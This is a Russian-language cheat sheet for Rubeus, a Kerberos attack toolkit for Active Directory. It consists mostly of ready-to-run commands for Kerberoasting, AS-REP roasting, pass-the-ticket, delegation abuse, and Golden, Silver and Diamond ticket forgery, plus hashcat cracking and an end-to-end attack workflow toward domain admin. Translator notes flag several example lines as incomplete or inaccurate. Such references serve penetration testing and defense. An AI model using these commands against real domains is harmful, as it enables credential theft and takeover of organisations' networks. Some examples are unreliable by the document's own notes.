<a id="-rubeus---kerberos-abuse-toolkit"></a>
# 🎫 Rubeus — набор инструментов для работы с Kerberos и проверки его безопасности

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md) • [🏠 Русская главная](../../README.ru.md)

```
  ██████╗ ██╗   ██╗██████╗ ███████╗██╗   ██╗███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔════╝██║   ██║██╔════╝
  ██████╔╝██║   ██║██████╔╝█████╗  ██║   ██║███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔══╝  ██║   ██║╚════██║
  ██║  ██║╚██████╔╝██████╔╝███████╗╚██████╔╝███████║
  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
           Kerberos Interaction & Abuse
```

<p align="center">
  <img src="https://img.shields.io/badge/Rubeus-Kerberos-red?style=for-the-badge" alt="Rubeus">
  <img src="https://img.shields.io/badge/Active_Directory-blue?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/C%23-green?style=for-the-badge" alt="C#">
</p>

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [Что такое Rubeus](#-what-is-rubeus)
- [Операции с билетами](#-ticket-operations)
- [Kerberoasting](#-kerberoasting)
- [AS-REP roasting](#-as-rep-roasting)
- [Атаки с билетами](#-ticket-attacks)
- [Атаки на делегирование](#-delegation-attacks)
- [Golden Ticket и Silver Ticket](#-golden--silver-tickets)
- [Краткий справочник](#-quick-reference)

---

<a id="-what-is-rubeus"></a>
## 🎯 Что такое Rubeus

**Rubeus** — набор инструментов на C# для взаимодействия с Kerberos и проверки возможностей злоупотребления протоколом:

- 🎫 **Операции с билетами** — запрос, продление и просмотр сведений о билетах
- 🔓 **Kerberoasting** — получение данных сервисных билетов для автономного подбора паролей
- 🔑 **AS-REP roasting** — атака на учётные записи без предварительной аутентификации (preauth)
- 🎭 **Pass-the-Ticket** — повторное использование похищенных билетов
- ✨ **Golden/Silver Ticket** — создание поддельных билетов

---

<a id="-basic-usage"></a>
## 🚀 Основы использования

<a id="running-rubeus"></a>
### Запуск Rubeus

> **Уточнение:** Assembly.LoadFile загружает сборку, но приведённая строка сама по себе не вызывает её точку входа. Пример оригинала сохранён. См. [документацию Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.loadfile).

```powershell
# Непосредственный запуск
.\Rubeus.exe <command> [options]

# Выполнение в памяти (Cobalt Strike)
execute-assembly Rubeus.exe <command>

# Загрузка через PowerShell
[System.Reflection.Assembly]::LoadFile("C:\path\Rubeus.exe")
```

---

<a id="-ticket-operations"></a>
## 🎟️ Операции с билетами

<a id="request-tgt"></a>
### Запрос TGT

> **Сертификат:** этот вариант использует PKINIT; одного произвольного PFX недостаточно. Нужны подходящие сертификат, закрытый ключ и поддержка аутентификации со стороны KDC. См. [asktgt](https://github.com/GhostPack/Rubeus#asktgt).

```powershell
# С паролем
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /domain:domain.local

# С хешем NTLM
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /domain:domain.local

# С ключом AES256
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /domain:domain.local

# С сертификатом
.\Rubeus.exe asktgt /user:admin /certificate:cert.pfx /password:pfxpass

# Вывод в файл
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /outfile:ticket.kirbi
```

<a id="request-tgs"></a>
### Запрос TGS

```powershell
# Запрос сервисного билета
.\Rubeus.exe asktgs /ticket:base64ticket /service:cifs/server.domain.local

# С TGT из файла
.\Rubeus.exe asktgs /ticket:ticket.kirbi /service:http/server.domain.local
```

<a id="list-tickets"></a>
### Список билетов

> **Уточнение:** `/luid:0x3e7` выбирает конкретный сеанс, а не все билеты. Область видимости triage/dump зависит от повышения прав. См. [triage](https://github.com/GhostPack/Rubeus#triage).

```powershell
# Список билетов текущего пользователя
.\Rubeus.exe triage

# Список всех билетов (требуются права администратора)
.\Rubeus.exe triage /luid:0x3e7

# Подробное извлечение билетов
.\Rubeus.exe dump
```

<a id="pass-the-ticket"></a>
### Pass-the-Ticket — использование существующего билета

> **Сеанс:** LUID — идентификатор сеанса входа. Значение `0x123456` условное: оно должно соответствовать реально созданному сеансу. Работа с другим LUID требует повышения прав. См. [ptt](https://github.com/GhostPack/Rubeus#ptt).

```powershell
# Импорт билета в текущий сеанс
.\Rubeus.exe ptt /ticket:base64ticket

# Импорт из файла
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Создание нового сеанса входа и импорт
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe ptt /ticket:ticket.kirbi /luid:0x123456
```

<a id="describe-ticket"></a>
### Просмотр сведений о билете

```powershell
# Просмотр сведений о билете
.\Rubeus.exe describe /ticket:base64ticket

# Из файла
.\Rubeus.exe describe /ticket:ticket.kirbi
```

---

<a id="-kerberoasting"></a>
## 🍖 Kerberoasting

<a id="basic-kerberoast"></a>
### Базовый Kerberoasting

> **Уточнение:** `/rc4opsec` отбирает учётные записи без включённого AES; это не универсальное понижение AES до RC4. `/aes` поддерживается, но не гарантирует незаметность. См. [Kerberoasting](https://github.com/GhostPack/Rubeus#kerberoast).

```powershell
# Kerberoasting для всех SPN
.\Rubeus.exe kerberoast

# Вывод в файл (формат hashcat)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Конкретный пользователь
.\Rubeus.exe kerberoast /user:sqlservice

# Понижение до RC4 (etype 23)
.\Rubeus.exe kerberoast /rc4opsec
```

<a id="advanced-kerberoasting"></a>
### Дополнительные возможности Kerberoasting

```powershell
# С конкретным TGT
.\Rubeus.exe kerberoast /ticket:base64tgt

# Только статистика (без запросов билетов)
.\Rubeus.exe kerberoast /stats

# Конкретный SPN
.\Rubeus.exe kerberoast /spn:MSSQLSvc/sql.domain.local

# Шифрование AES (менее заметно)
.\Rubeus.exe kerberoast /aes

# Фильтр по пользователю
.\Rubeus.exe kerberoast /user:svc_sql /nowrap
```

<a id="cracking-kerberoast-hashes"></a>
### Подбор паролей по данным Kerberoasting

> **Режимы Hashcat:** `13100` соответствует Kerberos TGS-REP etype 23 (RC4), а `18200` ниже — AS-REP etype 23. Они не подходят автоматически к результатам AES. См. [официальные примеры Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes).

```bash
# Hashcat (режим 13100)
hashcat -m 13100 kerberoast.txt wordlist.txt

# John
john --wordlist=rockyou.txt kerberoast.txt
```

---

<a id="-as-rep-roasting"></a>
## 🔓 AS-REP roasting

<a id="basic-as-rep-roast"></a>
### Базовый AS-REP roasting

> **Формат результата:** без `/format:hashcat` asreproast по умолчанию использует формат John. В оригинале сохранение `asrep.txt` и выбор Hashcat показаны отдельными командами. См. [asreproast](https://github.com/GhostPack/Rubeus#asreproast).

```powershell
# Поиск пользователей без preauth и получение данных для подбора пароля
.\Rubeus.exe asreproast

# Вывод в файл
.\Rubeus.exe asreproast /outfile:asrep.txt

# Конкретный пользователь
.\Rubeus.exe asreproast /user:targetuser

# Формат hashcat
.\Rubeus.exe asreproast /format:hashcat
```

<a id="cracking-as-rep-hashes"></a>
### Подбор паролей по AS-REP

```bash
# Hashcat (режим 18200)
hashcat -m 18200 asrep.txt wordlist.txt
```

---

<a id="-ticket-attacks"></a>
## 🎭 Атаки с билетами

<a id="overpass-the-hash-pass-the-key"></a>
### Overpass-the-Hash (Pass-the-Key) — получение билета с помощью ключа

> **Уточнение:** `/ptt` импортирует билет в сеанс; сам по себе новый сеанс не создаёт. Подпись первого примера неточна. См. [asktgt](https://github.com/GhostPack/Rubeus#asktgt).

```powershell
# Получение TGT с хешем, создание нового сеанса
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# С ключом AES
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /ptt

# Создание отдельного временного процесса
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt /luid:0x123456
```

<a id="s4u-service-for-user"></a>
### S4U (Service for User) — запросы от имени пользователя

> **Предпосылки:** s4u может выполнять цепочку S4U2Self/S4U2Proxy. Подписи примеров упрощены; применимость зависит от настроек делегирования и учётных записей. См. [s4u](https://github.com/GhostPack/Rubeus#s4u).

```powershell
# S4U2Self — представление пользователя собственной службе
.\Rubeus.exe s4u /user:serviceaccount /rc4:HASH /impersonateuser:admin /msdsspn:cifs/target.domain.local

# S4U2Proxy — представление пользователя другой службе
.\Rubeus.exe s4u /ticket:tgt.kirbi /impersonateuser:admin /msdsspn:cifs/dc.domain.local /altservice:ldap

# Полная цепочка
.\Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

<a id="-delegation-attacks"></a>
## 🔀 Атаки на делегирование

<a id="unconstrained-delegation"></a>
### Неограниченное делегирование (Unconstrained Delegation)

```powershell
# Отслеживание TGT на узле с неограниченным делегированием
.\Rubeus.exe monitor /interval:5 /nowrap

# Конкретный фильтр
.\Rubeus.exe monitor /targetuser:DC$ /interval:5

# Сбор TGT
.\Rubeus.exe harvest /interval:30
```

<a id="constrained-delegation"></a>
### Ограниченное делегирование (Constrained Delegation)

```powershell
# Запрос билета для разрешённой службы
.\Rubeus.exe s4u /user:svcaccount /rc4:HASH /impersonateuser:administrator /msdsspn:time/dc.domain.local /altservice:cifs /ptt
```

<a id="resource-based-constrained-delegation"></a>
### Ограниченное делегирование на основе ресурса (RBCD)

```powershell
# После настройки RBCD с помощью PowerMad/PowerView
# Запрос билета от имени компьютера атакующего
.\Rubeus.exe s4u /user:attackermachine$ /rc4:MACHINEACCOUNTHASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

<a id="-golden--silver-tickets"></a>
## ✨ Golden Ticket и Silver Ticket

<a id="golden-ticket"></a>
### Golden Ticket — поддельный TGT

> **Совместимость параметров:** текущий парсер golden не обрабатывает `/krbtgt`; первые два примера оригинала поэтому неполны для этой версии. Поддерживаемые параметры ключей перечислены в [Golden.cs](https://github.com/GhostPack/Rubeus/blob/master/Rubeus/Commands/Golden.cs). Исходные строки сохранены.

```powershell
# Создание Golden Ticket (требуется хеш krbtgt)
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGTHASH /ptt

# Указание групп
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /groups:512,513,519 /ptt

# С ключом AES
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /aes256:AESKEY /ptt
```

<a id="silver-ticket"></a>
### Silver Ticket — поддельный сервисный билет

> **Уточнение DCSync:** билет для LDAP не означает готовый доступ к репликации каталога. DCSync использует интерфейс DRS по RPC, а не обычный LDAP. Подпись оригинала сохранена; см. [протокол Microsoft MS-DRSR](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47).

```powershell
# Создание Silver Ticket (требуется хеш учётной записи службы)
.\Rubeus.exe silver /service:cifs/target.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:SERVICEHASH /ptt

# Служба LDAP (DCSync)
.\Rubeus.exe silver /service:ldap/dc.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:DCHASH /ptt
```

<a id="diamond-ticket"></a>
### Diamond Ticket — изменение настоящего TGT

> **Неполный пример:** для изменения и повторной подписи TGT нужен соответствующий ключ krbtgt; `/krbkey` в исходной строке опущен. `/enctype:aes` — допустимое обозначение AES256. См. [Diamond.cs](https://github.com/GhostPack/Rubeus/blob/master/Rubeus/Commands/Diamond.cs) и [описание diamond](https://github.com/GhostPack/Rubeus#diamond).

```powershell
# Изменённый настоящий TGT
.\Rubeus.exe diamond /user:admin /password:P@ssw0rd /enctype:aes /domain:domain.local /dc:dc.domain.local /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

<a id="essential-commands"></a>
### Основные команды

| Команда | Описание |
| --------- | ------------- |
| `asktgt` | Запрос TGT |
| `asktgs` | Запрос TGS |
| `kerberoast` | Получение данных сервисных билетов для подбора паролей |
| `asreproast` | AS-REP roasting |
| `ptt` | Pass-the-Ticket — использование билета |
| `s4u` | Service for User — запросы от имени пользователя |
| `golden` | Создание Golden Ticket |
| `silver` | Создание Silver Ticket |
| `dump` | Извлечение всех билетов |
| `triage` | Список билетов |

<a id="authentication-options"></a>
### Параметры аутентификации

| Параметр | Описание |
| -------- | ------------- |
| `/user:` | Имя пользователя |
| `/password:` | Пароль |
| `/rc4:` | Хеш NTLM |
| `/aes256:` | Ключ AES256 |
| `/ticket:` | Билет в Base64 |

<a id="common-options"></a>
### Общие параметры

| Параметр | Описание |
| -------- | ------------- |
| `/ptt` | Pass-the-Ticket — использование билета |
| `/outfile:` | Вывод в файл |
| `/nowrap` | Не переносить строки Base64 |
| `/domain:` | Целевой домен |
| `/dc:` | Контроллер домена |

<a id="attack-workflow"></a>
### Последовательность атаки

```powershell
# 1. Kerberoast
.\Rubeus.exe kerberoast /outfile:kerb.txt

# 2. Подбор паролей по хешам
hashcat -m 13100 kerb.txt rockyou.txt

# 3. Получение TGT с подобранным паролем
.\Rubeus.exe asktgt /user:svc /password:CrackedPass /ptt

# 4. Или Overpass-the-Hash
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt

# 5. Доступ к ресурсам
dir \\server\share
```

---

<a id="-resources"></a>
## 📚 Ресурсы

- [Rubeus на GitHub](https://github.com/GhostPack/Rubeus)
- [Блог HarmJ0y](https://blog.harmj0y.net/)
- [SpecterOps](https://specterops.io/)

<a id="related-cheatsheets"></a>
### Связанные шпаргалки
- [BloodHound](../../BloodHound/translations/README.ru.md)
- [Impacket](../../Impacket/translations/README.ru.md)
- [Mimikatz](../../Mimikatz/translations/README.ru.md)

---

<p align="center">
  <b>🎫 Осваивайте Kerberos!</b><br>
  <i>Rubeus — билет к правам администратора домена</i>
</p>
